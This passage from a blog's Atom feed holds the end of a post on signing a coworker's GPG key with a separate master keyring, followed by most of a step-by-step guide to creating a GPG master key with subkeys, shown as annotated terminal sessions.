subkey. For doing that I used the handy &lt;code&gt;--homedir&lt;/code&gt; option.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--homedir&lt;span class="o"&gt;=&lt;/span&gt;/path/to/my/master/gnupg/folder&lt;span class="w"&gt; &lt;/span&gt;--sign-key&lt;span class="w"&gt; &lt;/span&gt;mycoworker@myjob.com
gpg:&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mycoworker@myjob.com&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;not&lt;span class="w"&gt; &lt;/span&gt;found:&lt;span class="w"&gt; &lt;/span&gt;public&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;not&lt;span class="w"&gt; &lt;/span&gt;found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;How's that possible? I am positive that I've imported my coworker's key - we have even exchanged encrypted email with each other!&lt;/p&gt;
&lt;p&gt;Well, the fact is that I imported the key, yes, but I did it in my local keyring which is the one located at &lt;code&gt;~/.gnupg&lt;/code&gt; and thus not the one my master key refers to. Pretty much as when using GPG on multiple computers: you have to re-import all the public keys from scratch.&lt;/p&gt;
&lt;p&gt;Ok, so what are the options? Export the key I want to sign, import it into the master keyring, sign it, export it from the master keyiring, and finally import it into the local keyring? Sure, you could do that, but it's quite cumbersome. Fortunately, gpg has a better solution for that: the &lt;code&gt;--keyring&lt;/code&gt; option!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--homedir&lt;span class="o"&gt;=&lt;/span&gt;/path/to/my/master/gnupg/folder&lt;span class="w"&gt; &lt;/span&gt;--keyring&lt;span class="w"&gt; &lt;/span&gt;~/.gnupg/pubring.gpg&lt;span class="w"&gt; &lt;/span&gt;--sign-key&lt;span class="w"&gt; &lt;/span&gt;mycoworker@myjob.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And voilà! Now you can proceed signing the key.&lt;/p&gt;</content><category term="cryptography"></category><category term="GPG"></category><category term="cryptography"></category><category term="howto"></category></entry><entry><title>How to create a GPG key with subkeys</title><link href="https://railslide.io/create-gpg-key-with-subkeys.html" rel="alternate"></link><published>2017-04-19T00:00:00+02:00</published><updated>2017-04-19T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2017-04-19:/create-gpg-key-with-subkeys.html</id><summary type="html">&lt;p&gt;A step by step guide for creating a GPG key with subkeys.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I wanted to create a GPG key - so far so good. The problem is that I also wanted to use GPG on multiple devices, ideally even on my phone. I could have - &lt;em&gt;in theory&lt;/em&gt; - copied the key over to all the needed machines, but that would have been a terrible idea. What if I lose my phone/laptop? My key would be compromised and I'd be left with no other choice than revoking it and losing all the previous signatures.&lt;/p&gt;
&lt;p&gt;That's when subkeys come in.&lt;/p&gt;
&lt;p&gt;Subkeys are almost identical to normal key pairs, except they can't be used for signing other people's keys, they're bound to a master key pair, and - here comes the interesting part! - they can be revoked independently from the master key.&lt;/p&gt;
&lt;p&gt;So, in practical terms, they allow me to do the following: create a master key pair, create a subkey pair, remove the master key from my laptop, store it in a safe place, move on with my encrypting/decrypting life as usual. If catastrophe strikes, I retrieve my master key from its safe place, revoke the subkey, create a new subkey pair and I'm ready to go - and since each link of the Web of Trust is connected to the UID of the master key, my reputation stays untouched.&lt;/p&gt;
&lt;p&gt;The only problem with all this workflow is that it requires a bunch of steps and I have the tendency to forget them pretty quickly. So, for the sake of my future self (or anyone else who might found them useful) here it is the whole process.&lt;/p&gt;
&lt;h2&gt;Set GPG to prefer SHA2&lt;/h2&gt;
&lt;p&gt;GPG defaults to SHA1 as preferred hash, so let's set it to prefer SHA2 instead.
Check if the following lines are present in &lt;code&gt;~/.gnupg/gpg.conf&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;personal-digest-preferences SHA512 SHA384 SHA256 SHA224
default-preference-list SHA512 SHA384 SHA256 SHA224 AES256 AES192 AES CAST5 BZIP2 ZLIB ZIP Uncompressed
cert-digest-algo SHA512
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If not, add them.&lt;/p&gt;
&lt;h2&gt;Create a master key&lt;/h2&gt;
&lt;p&gt;Create the master key - I'm going to mark user inputs with &lt;code&gt;# [input value] &amp;lt;--&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--gen-key
gpg&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;GnuPG&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.4.11&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Copyright&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2010&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Free&lt;span class="w"&gt; &lt;/span&gt;Software&lt;span class="w"&gt; &lt;/span&gt;Foundation,&lt;span class="w"&gt; &lt;/span&gt;Inc.
This&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;free&lt;span class="w"&gt; &lt;/span&gt;software:&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;are&lt;span class="w"&gt; &lt;/span&gt;free&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;change&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt;  &lt;/span&gt;redistribute&lt;span class="w"&gt; &lt;/span&gt;it.
There&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;NO&lt;span class="w"&gt; &lt;/span&gt;WARRANTY,&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;extent&lt;span class="w"&gt; &lt;/span&gt;permitted&lt;span class="w"&gt; &lt;/span&gt;by&lt;span class="w"&gt; &lt;/span&gt;law.

Please&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;what&lt;span class="w"&gt; &lt;/span&gt;kind&lt;span class="w"&gt; &lt;/span&gt;of&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want:
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;default&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;DSA&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;Elgamal
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;DSA&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;sign&lt;span class="w"&gt; &lt;/span&gt;only&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;sign&lt;span class="w"&gt; &lt;/span&gt;only&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;selection?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 1 &amp;lt;--&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When it comes to choosing the length make sure to choose the longest available option (4096 at the time of writing).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;keys&lt;span class="w"&gt; &lt;/span&gt;may&lt;span class="w"&gt; &lt;/span&gt;be&lt;span class="w"&gt; &lt;/span&gt;between&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;bits&lt;span class="w"&gt; &lt;/span&gt;long.
What&lt;span class="w"&gt; &lt;/span&gt;keysize&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2048&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;# 4096 &amp;lt;-- (the longer the better!)&lt;/span&gt;

Requested&lt;span class="w"&gt; &lt;/span&gt;keysize&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;bits
Please&lt;span class="w"&gt; &lt;/span&gt;specify&lt;span class="w"&gt; &lt;/span&gt;how&lt;span class="w"&gt; &lt;/span&gt;long&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;should&lt;span class="w"&gt; &lt;/span&gt;be&lt;span class="w"&gt; &lt;/span&gt;valid.
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;does&lt;span class="w"&gt; &lt;/span&gt;not&lt;span class="w"&gt; &lt;/span&gt;expire
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;days
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;w&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;weeks
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;m&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;months
&lt;span class="w"&gt;    &lt;/span&gt;&amp;lt;n&amp;gt;y&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;expires&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;n&lt;span class="w"&gt; &lt;/span&gt;years
Key&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;valid&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 0 &amp;lt;--&lt;/span&gt;

Key&lt;span class="w"&gt; &lt;/span&gt;does&lt;span class="w"&gt; &lt;/span&gt;not&lt;span class="w"&gt; &lt;/span&gt;expire&lt;span class="w"&gt; &lt;/span&gt;at&lt;span class="w"&gt; &lt;/span&gt;all
Is&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;correct?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;y/N&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y &amp;lt;--&lt;/span&gt;

You&lt;span class="w"&gt; &lt;/span&gt;need&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;user&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;identify&lt;span class="w"&gt; &lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;software&lt;span class="w"&gt; &lt;/span&gt;constructs&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;user&lt;span class="w"&gt; &lt;/span&gt;ID
from&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;Real&lt;span class="w"&gt; &lt;/span&gt;Name,&lt;span class="w"&gt; &lt;/span&gt;Comment&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;E-mail&lt;span class="w"&gt; &lt;/span&gt;Address&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;form:
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Heinrich Heine (Der Dichter) &amp;lt;heinrichh@duesseldorf.de&amp;gt;&amp;quot;&lt;/span&gt;

Real&lt;span class="w"&gt; &lt;/span&gt;name:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# [Your name] &amp;lt;--&lt;/span&gt;

E-mail&lt;span class="w"&gt; &lt;/span&gt;address:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# [Your email address] &amp;lt;--&lt;/span&gt;

Comment:
You&lt;span class="w"&gt; &lt;/span&gt;selected&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;USER-ID:
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;[Your name] &amp;lt;[your email address]&amp;gt;&amp;quot;&lt;/span&gt;

Change&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;N&lt;span class="o"&gt;)&lt;/span&gt;ame,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt;omment,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;E&lt;span class="o"&gt;)&lt;/span&gt;-mail&lt;span class="w"&gt; &lt;/span&gt;or&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt;kay/&lt;span class="o"&gt;(&lt;/span&gt;Q&lt;span class="o"&gt;)&lt;/span&gt;uit?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# o &amp;lt;--&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When prompted for a passphrase, make sure to choose a strong one - ideally long and hard to guess. If someone gets access to the secret key, the passphrase would be the only thing left to prevent them from using it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;You&lt;span class="w"&gt; &lt;/span&gt;need&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;Passphrase&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;protect&lt;span class="w"&gt; &lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;secret&lt;span class="w"&gt; &lt;/span&gt;key.
&lt;span class="c1"&gt;# Enter passphrase &amp;lt;--&lt;/span&gt;

We&lt;span class="w"&gt; &lt;/span&gt;need&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;generate&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;lot&lt;span class="w"&gt; &lt;/span&gt;of&lt;span class="w"&gt; &lt;/span&gt;random&lt;span class="w"&gt; &lt;/span&gt;bytes.&lt;span class="w"&gt; &lt;/span&gt;It&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;good&lt;span class="w"&gt; &lt;/span&gt;idea&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;perform
some&lt;span class="w"&gt; &lt;/span&gt;other&lt;span class="w"&gt; &lt;/span&gt;action&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;on&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;keyboard,&lt;span class="w"&gt; &lt;/span&gt;move&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;mouse,&lt;span class="w"&gt; &lt;/span&gt;utilize&lt;span class="w"&gt; &lt;/span&gt;the
disks&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;during&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;prime&lt;span class="w"&gt; &lt;/span&gt;generation&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;gives&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;random&lt;span class="w"&gt; &lt;/span&gt;number
generator&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;better&lt;span class="w"&gt; &lt;/span&gt;chance&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;gain&lt;span class="w"&gt; &lt;/span&gt;enough&lt;span class="w"&gt; &lt;/span&gt;entropy.
.............+++++
..+++++

gpg:&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;marked&lt;span class="w"&gt; &lt;/span&gt;as&lt;span class="w"&gt; &lt;/span&gt;ultimately&lt;span class="w"&gt; &lt;/span&gt;trusted
public&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;secret&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;created&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;signed.

gpg:&lt;span class="w"&gt; &lt;/span&gt;checking&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;trustdb
gpg:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;marginal&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;needed,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;complete&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;needed,&lt;span class="w"&gt; &lt;/span&gt;PGP&lt;span class="w"&gt; &lt;/span&gt;trust&lt;span class="w"&gt; &lt;/span&gt;model
gpg:&lt;span class="w"&gt; &lt;/span&gt;depth:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;valid:&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;signed:&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;trust:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-,&lt;span class="w"&gt; &lt;/span&gt;0q,&lt;span class="w"&gt; &lt;/span&gt;0n,&lt;span class="w"&gt; &lt;/span&gt;0m,&lt;span class="w"&gt; &lt;/span&gt;0f,&lt;span class="w"&gt; &lt;/span&gt;1u
pub&lt;span class="w"&gt;   &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17
&lt;span class="w"&gt;      &lt;/span&gt;Key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;fingerprint&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Key&lt;span class="w"&gt; &lt;/span&gt;fingerprint&lt;span class="o"&gt;]&lt;/span&gt;
uid&lt;span class="w"&gt;                  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;name&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt;
sub&lt;span class="w"&gt;   &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Congratulations! The master key has been created!&lt;/p&gt;
&lt;h2&gt;Set your key to prefer strong hashes&lt;/h2&gt;
&lt;p&gt;In theory, if hash preferences were set in the &lt;code&gt;gpg.conf&lt;/code&gt; file before creating the key, this step should not be necessary. But better safe than sorry.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--edit-key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;
gpg&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;GnuPG&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.4.11&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Copyright&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2010&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Free&lt;span class="w"&gt; &lt;/span&gt;Software&lt;span class="w"&gt; &lt;/span&gt;Foundation,&lt;span class="w"&gt; &lt;/span&gt;Inc.
This&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;free&lt;span class="w"&gt; &lt;/span&gt;software:&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;are&lt;span class="w"&gt; &lt;/span&gt;free&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;change&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;redistribute&lt;span class="w"&gt; &lt;/span&gt;it.
There&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;NO&lt;span class="w"&gt; &lt;/span&gt;WARRANTY,&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;extent&lt;span class="w"&gt; &lt;/span&gt;permitted&lt;span class="w"&gt; &lt;/span&gt;by&lt;span class="w"&gt; &lt;/span&gt;law.

Secret&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;available.

gpg:&lt;span class="w"&gt; &lt;/span&gt;checking&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;trustdb
gpg:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;marginal&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;needed,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;complete&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;needed,&lt;span class="w"&gt; &lt;/span&gt;PGP&lt;span class="w"&gt; &lt;/span&gt;trust&lt;span class="w"&gt; &lt;/span&gt;model
gpg:&lt;span class="w"&gt; &lt;/span&gt;depth:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;valid:&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;signed:&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;trust:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-,&lt;span class="w"&gt; &lt;/span&gt;0q,&lt;span class="w"&gt; &lt;/span&gt;0n,&lt;span class="w"&gt; &lt;/span&gt;0m,&lt;span class="w"&gt; &lt;/span&gt;0f,&lt;span class="w"&gt; &lt;/span&gt;1u
